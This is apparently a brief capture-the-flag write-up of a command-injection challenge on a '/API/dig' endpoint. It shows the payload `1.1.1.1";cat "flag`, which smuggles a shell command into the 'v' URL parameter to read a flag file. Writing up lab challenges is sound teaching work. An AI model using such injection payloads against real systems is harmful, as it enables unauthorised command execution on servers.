# RCE_3 - site.scm.CdU9Xbn8BaPxZssoouDPIg.exam.ns.agency (/API/dig)

After visiting the robots.txt file and visiting the `/API/dig` path to discover the `v` parameter, if a user were to visiting `/API/dig?v=1.1.1.1` they would receive the following output.

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CDBDAD1A1E89CCC50B184DFCDFAA97E7399DB0AA30A1DBB2365E916F0CCC6B11_1528381150213_Screen+Shot+2018-06-07+at+11.54.20+pm.png)

The same way as rce_1, and rce_2, visiting the URL `/API/dig?v=1.1.1.1";cat "flag` to release the flag.

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CDBDAD1A1E89CCC50B184DFCDFAA97E7399DB0AA30A1DBB2365E916F0CCC6B11_1528381181667_Screen+Shot+2018-06-07+at+11.54.46+pm.png)
